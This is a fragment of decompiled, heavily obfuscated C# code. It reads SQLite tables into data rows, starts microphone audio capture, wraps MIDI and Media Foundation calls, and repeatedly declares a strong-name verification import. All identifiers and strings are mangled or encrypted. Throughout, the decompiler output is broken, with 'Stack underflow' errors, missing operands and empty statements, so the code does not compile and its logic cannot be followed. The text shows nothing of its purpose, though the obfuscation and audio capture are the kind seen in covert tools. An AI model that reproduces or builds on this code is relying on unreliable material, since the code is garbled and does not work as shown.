										if (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj6, 1), P_3, StringComparison.OrdinalIgnoreCase) != 0 && P_3 != null)
										{
											continue;
										}
										DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
										_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
										_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
										_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107350423), _0003);
										_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362723), _009E_0003._007E_0001_0008(obj6, 1));
										_0083_0004 obj7 = _0083_0004._007E_0093_0008;
										DataRow dataRow2 = dataRow;
										string text2 = _0080._0014._0001(107358816);
										object obj8 = _008F_0004._007E_0015_000E(obj6, 2);
										IFormatProvider formatProvider = _008F_0003._008B_0007();
										obj7(dataRow2, text2, _0018._0001(_0002: false, formatProvider, obj8));
										_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107358899), false);
										global::_0010._001C obj9 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107349570), new object[3]
										{
											_0003,
											global::_0003._007E_0080(_009E_0003._007E_0001_0008(obj6, 1), _0080._0014._0001(107361834), _0080._0014._0001(107361829)),
											text
										}), _0002);
										try
										{
											_0014 obj10 = _0018._0001(obj9);
											try
											{
												if (global::_001B._007E_008F_0003(obj10) && !_0008_0005._007E_0091_000E(obj10, 4))
												{
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107349636), _009E_0003._007E_0001_0008(obj10, 4));
												}
											}
											finally
											{
												if (obj10 != null)
												{
													global::_0008._007E_0098(obj10);
												}
											}
										}
										finally
										{
											if (obj9 != null)
											{
												global::_0008._007E_0098(obj9);
											}
										}
										if (list.Count > 0 && _0012_0004._007E_0019_0008(_009E_0003._007E_0001_0008(obj6, 1), global::_000F._008B_0002(_0080._0014._0001(107350013), _009E_0003._007E_0001_0008(obj2, 2)), StringComparison.InvariantCultureIgnoreCase))
										{
											global::_0010._001C obj11 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107361824), new object[2]
											{
												_0003,
												_009E_0003._007E_0001_0008(obj6, 1)
											}), _0002);
											try
											{
												_0014 obj12 = _0018._0001(obj11);
												try
												{
													int num = 0;
													while (global::_001B._007E_008F_0003(obj12))
													{
														if (!list.Contains(_0004_0005._007E_008D_000E(obj12, 1)))
														{
															num = 0;
															break;
														}
														num++;
													}
													if (num == list.Count)
													{
														_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107358899), true);
														list.Clear();
													}
												}
												finally
												{
													if (obj12 != null)
													{
														global::_0008._007E_0098(obj12);
													}
												}
											}
											finally
											{
												if (obj11 != null)
												{
													global::_0008._007E_0098(obj11);
												}
											}
										}
										_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
									}
								}
								finally
								{
									if (obj6 != null)
									{
										global::_0008._007E_0098(obj6);
									}
								}
							}
							finally
							{
								if (obj5 != null)
								{
									global::_0008._007E_0098(obj5);
								}
							}
						}
						catch (SQLiteException)
						{
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static void _0001(double _0002, global::_0001._007F P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_1._0001, _0002);
		}

		static global::_000E._0018 _0001(_001E._0010 _0002, BinaryReader P_1)
		{
			//IL_00fe: Incompatible stack heights: 0 vs 1
			//IL_010a: Incompatible stack heights: 0 vs 2
			new global::_000E._0018();
			global::_000E._0018 obj = (global::_000E._0018)/*Error near IL_0104: Stack underflow*/;
			_ = global::_001A._007E_001D_0003;
			/*Error near IL_0019: Stack underflow*/((object)/*Error near IL_0019: Stack underflow*/);
			obj.InNote = global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			global::_001A._007E_001D_0003(P_1);
			obj.VelocityScale = _001E_0006._007E_0013_0010(P_1);
			obj.Channel = global::_001A._007E_001D_0003(P_1);
			obj.OutNote = global::_001A._007E_001D_0003(P_1);
			obj.OutPort = global::_001A._007E_001D_0003(P_1);
			obj.VelocityAdjust = global::_001A._007E_001D_0003(P_1);
			char[] array = _0098_0005._007E_008A_000F(P_1, 32);
			int i;
			for (i = 0; i < array.Length && array[i] != 0; i++)
			{
			}
			obj.NoteName = new string(array, 0, i);
			return obj;
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmDriverOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, int _0004);

		static void _0001()
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 2
			new global::_000E._0005();
			global::_0010._0001._0001._0001 = (global::_000E._0005)/*Error near IL_0008: Stack underflow*/;
			_ = global::_0010._0001._0001._0001;
			new global::_0005._0005(44100, 2);
			((global::_000E._0005)/*Error near IL_005e: Stack underflow*/).WaveFormat = (global::_0005._0005)/*Error near IL_005e: Stack underflow*/;
			global::_0010._0001._0001._0001.BufferMilliseconds = 1000;
			global::_0010._0001._0001._0001.DataAvailable += _0018._0001;
			global::_0010._0001._0001._0001._0001();
		}

		static DateTime _0001(long _0002, DateTime? _0003)
		{
			//IL_010b: Incompatible stack heights: 0 vs 1
			//IL_0115: Incompatible stack heights: 0 vs 1
			//IL_011f: Incompatible stack heights: 0 vs 1
			_0018._0001((long)/*Error near IL_0115: Stack underflow*/);
			if ((int)/*Error near IL_000c: Stack underflow*/ == 0)
			{
				_ = _0003.HasValue;
				if ((int)/*Error near IL_0015: Stack underflow*/ == 0)
				{
					throw new ArgumentException(_0080._0014._0001(107358390));
				}
				return _0003.Value;
			}
			int num = (int)((_0002 + 43200000) / 86400000);
			int num2 = (int)(((double)num - 1867216.25) / 36524.25);
			num2 = num + 1 + num2 - num2 / 4;
			int num3 = num2 + 1524;
			int num4 = (int)(((double)num3 - 122.1) / 365.25);
			int num5 = 36525 * num4 / 100;
			int num6 = (int)((double)(num3 - num5) / 30.6001);
			int num7 = (int)(30.6001 * (double)num6);
			int day = num3 - num5 - num7;
			int num8 = ((num6 < 14) ? (num6 - 1) : (num6 - 13));
			int year = ((num8 > 2) ? (num4 - 4716) : (num4 - 4715));
			try
			{
				return new DateTime(year, num8, day);
			}
			catch
			{
				if (!_0003.HasValue)
				{
					throw;
				}
				return _0003.Value;
			}
		}

		static bool _0001(global::_0017._007F._0007 P_0)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			return ((global::_0017._007F._0007)/*Error near IL_0007: Stack underflow*/)._000E >= 16384;
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutGetNumDevs")]
		static extern int _0001();

		[DllImport("winmm.dll", EntryPoint = "waveInStart")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("mfreadwrite.dll", EntryPoint = "MFCreateSourceReaderFromByteStream", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In] _0010 _0002, [In] global::_0008._000E _0003, [MarshalAs(UnmanagedType.Interface)] out global::_0007._0013 _0004);

		unsafe static void _0001(ref IDictionary<string, long> _0002)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			if (*(object*)(nint)/*Error near IL_0003: Stack underflow*/ == null)
			{
				new Dictionary<string, long>();
				*(_003F*)(nint)/*Error near IL_000a: Stack underflow*/ = /*Error near IL_000a: Stack underflow*/;
			}
			_0002[_0080._0014._0001(107349956)] = global::_0002._0019.StaticMemoryUsed;
			_0002[_0080._0014._0001(107349971)] = global::_0002._0019.StaticMemoryHighwater;
		}

		static void _0001(_0019._0005 P_0)
		{
			//IL_00a2: Incompatible stack heights: 0 vs 2
			//IL_00a8: Incompatible stack heights: 0 vs 2
			//IL_00b2: Incompatible stack heights: 0 vs 1
			while (P_0._0001 != 0)
			{
				_ = _0008_0005._007E_0092_000E;
				_ = ((_0019._0005)/*Error near IL_0014: Stack underflow*/)._0001;
				_ = ((_0019._0005)/*Error near IL_00b2: Stack underflow*/).DesiredLatency;
				if (!/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/, (int)/*Error near IL_0023: Stack underflow*/))
				{
					_ = P_0._0001;
					_ = 1;
				}
				if (P_0._0001 != _001C._0005._0002)
				{
					continue;
				}
				int num = 0;
				global::_0007._0007[] array = P_0._0001;
				foreach (global::_0007._0007 obj in array)
				{
					if ((obj._0001._0001 & global::_000E._0004._0004) == global::_000E._0004._0004 || _0018._0001(obj))
					{
						num++;
					}
				}
				if (num == 0)
				{
					P_0._0001 = _001C._0005._0001;
					global::_001B._007E_0084_0003(P_0._0001);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(_0019._007F _0002, global::_0017._0080 P_1)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_003a: Stack underflow*/);
			}
			if (((global::_0017._0080)/*Error near IL_000d: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107349950));
			}
			return P_1._0001._0001(_0002, P_1._0003);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static short _0001(byte _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = _007F._0016._0001;
			return ((short[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_int64")]
		static extern long _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_cursor_rowid_interop")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, ref long _0004);

		[DllImport("winmm.dll", EntryPoint = "midiInOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0018._0012._0003 _0004, IntPtr _0005, int _0006);

		static string _0001(Assembly _0002)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			_0080._0014._0001(107349877);
			return (string)/*Error near IL_000c: Stack underflow*/;
		}

		static int _0001(ref int _0002, [Out] global::_0006._0010 _0003, int P_2)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0010)/*Error near IL_0009: Stack underflow*/)._0001.BlockAlign;
			if (/*Error near IL_000c: Stack underflow*/ % /*Error near IL_000c: Stack underflow*/!= 0)
			{
				P_2 -= P_2 % _0003._0001.BlockAlign;
			}
			return _0018._0001(_0003._0001, P_2, ref _0002);
		}

		static global::_0005._0005 _0001(int _0002, int _0003, int _0004, int _0005, WaveFormatEncoding _0006, int _0007)
		{
			//IL_0025: Expected O, but got Unknown
			//IL_002d: Expected O, but got Unknown
			//IL_0035: Expected O, but got Unknown
			//IL_003c: Expected O, but got Unknown
			//IL_003f: Incompatible stack heights: 0 vs 3
			//IL_0042: Incompatible stack heights: 0 vs 2
			//IL_0046: Incompatible stack heights: 0 vs 2
			new global::_0005._0005();
			((global::_0005._0005)/*Error near IL_000d: Stack underflow*/)._0001 = (WaveFormatEncoding)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			short num = (short)/*Error near IL_0011: Stack underflow*/;
			((global::_0005._0005)/*Error near IL_0016: Stack underflow*/)._0001 = num;
			/*Error near IL_0016: Stack underflow*/;
			((global::_0005._0005)/*Error near IL_001e: Stack underflow*/)._0001 = (int)/*Error near IL_001e: Stack underflow*/;
			((global::_0005._0005)/*Error near IL_001e: Stack underflow*/)._0002 = _0005;
			((global::_0005._0005)/*Error near IL_0025: Stack underflow*/)._0002 = (short)_0003;
			((global::_0005._0005)/*Error near IL_002d: Stack underflow*/)._0003 = (short)_0004;
			((global::_0005._0005)/*Error near IL_0035: Stack underflow*/)._0004 = 0;
			return (global::_0005._0005)/*Error near IL_003d: Stack underflow*/;
		}

		static void _0001(IntPtr _0002, object _0003, global::_0012._0014 P_2)
		{
			//IL_0011: Invalid comparison between Unknown and O
			//IL_0123: Incompatible stack heights: 0 vs 1
			//IL_0129: Incompatible stack heights: 0 vs 1
			//IL_012f: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				DBNull value = DBNull.Value;
				if ((object)/*Error near IL_0013: Stack underflow*/ != value)
				{
					Type type = _001D_0003._007E_009D_0006(_0003);
					if ((object)type == _0091._0080_0004(typeof(DateTime).TypeHandle))
					{
						P_2._0001._0002(_0002, _0018._0001((global::_0001._001A)P_2._0001, (DateTime)_0003));
						return;
					}
					if (_0003 is Exception ex)
					{
						P_2._0001._0001(_0002, global::_0002._007E_001E(ex));
						return;
					}
					switch (_0018._0001(type))
					{
					case global::_0014._0017._0006:
						P_2._0001._0001(_0002);
						break;
					case global::_0014._0017._0002:
						P_2._0001._0001(_0002, _001F_0006._0014_0010(_0003, _008F_0003._008C_0007()));
						break;
					case global::_0014._0017._0003:
						P_2._0001._0001(_0002, _007F_0006._0015_0010(_0003, _008F_0003._008C_0007()));
						break;
					case global::_0014._0017._0004:
						P_2._0001._0002(_0002, global::_0002._007E_0006(_0003));
						break;
					case global::_0014._0017._0005:
						P_2._0001._0001(_0002, (byte[])_0003);
						break;
					}
					return;
				}
			}
			((global::_0012._0014)/*Error near IL_001d: Stack underflow*/)._0001._0001(_0002);
		}

		static bool _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _0008_0005._007E_0093_000E(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			throw new InvalidCastException();
		}

		unsafe static global::_0017._0013 _0001(int _0002, global::_0017._0015 _0003, bool P_2)
		{
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 2
			//IL_004e: Incompatible stack heights: 0 vs 1
			global::_0017._0013 obj = default(global::_0017._0013);
			_ = ref obj;
			((global::_0017._0013*)(nint)/*Error near IL_0011: Stack underflow*/)->_0001 = (int)/*Error near IL_0011: Stack underflow*/;
			_ = ref obj;
			((global::_0017._0013*)(nint)/*Error near IL_001a: Stack underflow*/)->_0001 = (byte)/*Error near IL_001a: Stack underflow*/ != 0;
			global::_0017._0013 info = (global::_0017._0013)/*Error near IL_001d: Stack underflow*/;
			_0018._0001(_0003, _0003._0001._0001(_0003._0001, ref info), _0080._0014._0001(107349840));
			return info;
		}

		static void _0001(global::_0005._0007 _0002, global::_0018._000F P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = ((global::_0005._0007)/*Error near IL_0007: Stack underflow*/)._0001;
			((List<global::_0018._000F>)/*Error near IL_0017: Stack underflow*/).Add((global::_0018._000F)/*Error near IL_0017: Stack underflow*/);
		}

		static _001B._0003 _0001(_001E._0004 _0002, int P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_002d: Stack underflow*/)._0001((int)/*Error near IL_002d: Stack underflow*/, out int num, out int num2);
			/*Error near IL_0019: Stack underflow*/((int)/*Error near IL_0019: Stack underflow*/);
			return new _001B._0003(num, 0, num2);
		}

		static ICustomMarshaler _0001(string _0002)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			if (global::_000E._0007._0001 == null)
			{
				new global::_000E._0007();
				global::_000E._0007._0001 = (global::_000E._0007)/*Error near IL_000e: Stack underflow*/;
			}
			return global::_000E._0007._0001;
		}

		static DateTime _0001(int _0002, global::_0001._001A _0003, IntPtr P_2)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			string text = ((global::_0001._001A)/*Error near IL_000c: Stack underflow*/)._0001((IntPtr)/*Error near IL_000c: Stack underflow*/, _0002);
			return _0018._0001((global::_0001._001A)/*Error near IL_0011: Stack underflow*/, text);
		}

		static void _0001(global::_0017._007F._000E P_0)
		{
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 2
			if (((global::_0017._007F._000E)/*Error near IL_0007: Stack underflow*/)._0003 > 0)
			{
				_ = ((global::_0017._007F._000E)/*Error near IL_0011: Stack underflow*/)._0001;
				int num = P_0._0002;
				((global::_0017._007F._000E)/*Error near IL_0022: Stack underflow*/)._0002 = num + 1;
				int num2 = num;
				uint num3 = P_0._0001;
				((sbyte[])/*Error near IL_002b: Stack underflow*/)[num2] = (sbyte)(byte)num3;
				if (P_0._0003 > 8)
				{
					P_0._0001[P_0._0002++] = (byte)(P_0._0001 >> 8);
				}
			}
			P_0._0001 = 0u;
			P_0._0003 = 0;
		}

		static _0010 _0001(object _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			_0018._0001((object)/*Error near IL_0011: Stack underflow*/, out _0010 _);
			return (_0010)/*Error near IL_0009: Stack underflow*/;
		}

		static string _0001(_0080._0017 _0002)
		{
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0002._0019._0002.HasValue;
				if ((int)/*Error near IL_0009: Stack underflow*/ == 0)
				{
					_ = global::_0002._0019.SQLiteVersionNumber;
					int num = (int)/*Error near IL_0066: Stack underflow*/;
					global::_0002._0019._0002 = num >= 3007015;
				}
				if (global::_0002._0019._0002.Value)
				{
					IntPtr intPtr = _0018._0001(_0002);
					if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
					{
						return _0090_0003._008E_0007(intPtr);
					}
				}
			}
			catch (EntryPointNotFoundException)
			{
			}
			return _0018._0001(_0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0014._0008 P_0)
		{
			//IL_0039: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0014._0008)/*Error near IL_000c: Stack underflow*/)._0002;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0040: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				_0018._0001(_0018._0001(out ((global::_0014._0008)/*Error near IL_001c: Stack underflow*/)._0002, P_0._0001, 0), _0080._0014._0001(107384044));
			}
		}

		static void _0001(int _0002, global::_0001._0017 _0003, int _0004)
		{
			//IL_04e8: Incompatible stack heights: 0 vs 1
			//IL_04f2: Incompatible stack heights: 0 vs 1
			//IL_04f8: Incompatible stack heights: 0 vs 1
			_ = ((global::_0001._0017)/*Error near IL_04f2: Stack underflow*/).Band;
			((_0012)((object[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/])._0005[0] = _0004;
			_0003.Band[_0002]._0001[0] = _0018._0001(_0003.Band[_0002]._0001 + _0004);
			_0003.Band[_0002]._0004[0] = _0018._0001(_0003.Band[_0002]._0003 + _0004);
			for (int i = 0; i < 3; i++)
			{
				_0003.Band[_0002]._0008[i] = _0003.Band[_0002]._0004[i] >> 15;
			}
			int num = _0018._0001(_0003.Band[_0002]._0002[1] << 2);
			int num2 = ((_0003.Band[_0002]._0008[0] == _0003.Band[_0002]._0008[1]) ? (-num) : num);
			if (num2 > 32767)
			{
				num2 = 32767;
			}
			int num3 = ((_0003.Band[_0002]._0008[0] == _0003.Band[_0002]._0008[2]) ? 128 : (-128));
			num3 += num2 >> 7;
			num3 += _0003.Band[_0002]._0002[2] * 32512 >> 15;
			if (num3 > 12288)
			{
				num3 = 12288;
			}
			else if (num3 < -12288)
			{
				num3 = -12288;
			}
			_0003.Band[_0002]._0003[2] = num3;
			_0003.Band[_0002]._0008[0] = _0003.Band[_0002]._0004[0] >> 15;
			_0003.Band[_0002]._0008[1] = _0003.Band[_0002]._0004[1] >> 15;
			num = ((_0003.Band[_0002]._0008[0] == _0003.Band[_0002]._0008[1]) ? 192 : (-192));
			num2 = _0003.Band[_0002]._0002[1] * 32640 >> 15;
			_0003.Band[_0002]._0003[1] = _0018._0001(num + num2);
			num3 = _0018._0001(15360 - _0003.Band[_0002]._0003[2]);
			if (_0003.Band[_0002]._0003[1] > num3)
			{
				_0003.Band[_0002]._0003[1] = num3;
			}
			else if (_0003.Band[_0002]._0003[1] < -num3)
			{
				_0003.Band[_0002]._0003[1] = -num3;
			}
			num = ((_0004 != 0) ? 128 : 0);
			_0003.Band[_0002]._0008[0] = _0004 >> 15;
			for (int i = 1; i < 7; i++)
			{
				_0003.Band[_0002]._0008[i] = _0003.Band[_0002]._0005[i] >> 15;
				num2 = ((_0003.Band[_0002]._0008[i] == _0003.Band[_0002]._0008[0]) ? num : (-num));
				num3 = _0003.Band[_0002]._0006[i] * 32640 >> 15;
				_0003.Band[_0002]._0007[i] = _0018._0001(num2 + num3);
			}
			for (int i = 6; i > 0; i--)
			{
				_0003.Band[_0002]._0005[i] = _0003.Band[_0002]._0005[i - 1];
				_0003.Band[_0002]._0006[i] = _0003.Band[_0002]._0007[i];
			}
			for (int i = 2; i > 0; i--)
			{
				_0003.Band[_0002]._0001[i] = _0003.Band[_0002]._0001[i - 1];
				_0003.Band[_0002]._0004[i] = _0003.Band[_0002]._0004[i - 1];
				_0003.Band[_0002]._0002[i] = _0003.Band[_0002]._0003[i];
			}
			num = _0018._0001(_0003.Band[_0002]._0001[1] + _0003.Band[_0002]._0001[1]);
			num = _0003.Band[_0002]._0002[1] * num >> 15;
			num2 = _0018._0001(_0003.Band[_0002]._0001[2] + _0003.Band[_0002]._0001[2]);
			num2 = _0003.Band[_0002]._0002[2] * num2 >> 15;
			_0003.Band[_0002]._0002 = _0018._0001(num + num2);
			_0003.Band[_0002]._0003 = 0;
			for (int i = 6; i > 0; i--)
			{
				num = _0018._0001(_0003.Band[_0002]._0005[i] + _0003.Band[_0002]._0005[i]);
				_0003.Band[_0002]._0003 += _0003.Band[_0002]._0006[i] * num >> 15;
			}
			_0003.Band[_0002]._0003 = _0018._0001(_0003.Band[_0002]._0003);
			_0003.Band[_0002]._0001 = _0018._0001(_0003.Band[_0002]._0002 + _0003.Band[_0002]._0003);
		}

		static void _0001(IntPtr _0002, global::_0007._0014 P_1)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = ((global::_0007._0014)/*Error near IL_0007: Stack underflow*/)._0001;
			((_001A._0013)/*Error near IL_0018: Stack underflow*/)._0001((IntPtr)/*Error near IL_0018: Stack underflow*/);
		}

		static void _0001(object _0002, string _0003)
		{
			_0091_0002 obj = _0091_0002._009C_0005;
			object obj2 = global::_0015._0016._0001;
			object obj3;
			if (2u != 0)
			{
				obj3 = obj2;
			}
			if (true)
			{
				obj(obj2);
			}
			bool flag;
			global::_0010._001F obj4;
			try
			{
				flag = global::_0015._0016._0001;
				obj4 = ((global::_0015._0016._0001 == null) ? null : (_0083_0003._007E_001B_0007(global::_0015._0016._0001) as global::_0010._001F));
			}
			finally
			{
				_0091_0002._009D_0005(obj3);
			}
			if (flag)
			{
				obj4?.Invoke(null, new global::_0008._0012(IntPtr.Zero, _0002, _0003, null));
			}
		}

		static void _0001(_0019._0005 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			Exception ex = default(Exception);
			if (0 == 0)
			{
				ex = null;
			}
			try
			{
				_0018._0001((_0019._0005)/*Error near IL_0013: Stack underflow*/);
			}
			catch (Exception ex2)
			{
				ex = ex2;
			}
			finally
			{
				P_0._0001 = _001C._0005._0001;
				_0018._0001(ex, P_0);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_000E._0019 _0002, bool P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((global::_000E._0019)/*Error near IL_0009: Stack underflow*/)._0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_libversion")]
		static extern IntPtr _0001();

		static void _0001(_001F._0002[] _0002, global::_0018._0005[] _0003, global::_0006._0001 P_2)
		{
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 2
			int i = default(int);
			if (0 == 0)
			{
				i = 0;
			}
			for (; i < ((global::_0016._0002<global::_000E._0001>)P_2)._0001.Count - 1; i++)
			{
				_ = ((global::_0016._0002<global::_000E._0001>)/*Error near IL_0014: Stack underflow*/)._0001;
				global::_000E._0001 obj = ((List<global::_000E._0001>)/*Error near IL_001e: Stack underflow*/)[(int)/*Error near IL_001e: Stack underflow*/];
				obj._0001 = new global::_0018._0005[obj._0003];
				_0099_0002._0010_0006(_0003, obj._0001, obj._0001, 0, obj._0003);
				obj._0001 = new _001F._0002[obj._0004];
				_0099_0002._0010_0006(_0002, obj._0002, obj._0001, 0, obj._0004);
			}
			((global::_0016._0002<global::_000E._0001>)P_2)._0001.RemoveAt(((global::_0016._0002<global::_000E._0001>)P_2)._0001.Count - 1);
		}

		static int[] _0001(int _0002, int _0003, Guid _0004)
		{
			//IL_008d: Incompatible stack heights: 0 vs 1
			//IL_0099: Incompatible stack heights: 0 vs 1
			new MediaFoundationEncoder._0001();
			MediaFoundationEncoder._0001 obj = default(MediaFoundationEncoder._0001);
			if (0 == 0)
			{
				obj = (MediaFoundationEncoder._0001)/*Error near IL_0093: Stack underflow*/;
			}
			((MediaFoundationEncoder._0001)/*Error near IL_0017: Stack underflow*/)._0001 = _0002;
			obj._0002 = _0003;
			return (from _0002 in _0018._0001(_0004).Where(obj._0001).Select((Func<MediaType, int>)delegate
				{
					//IL_0005: Unknown result type (might be due to invalid IL or missing references)
					//IL_0007: Expected I4, but got Unknown
					//IL_0008: Incompatible stack heights: 0 vs 1
					//IL_000f: Incompatible stack heights: 0 vs 1
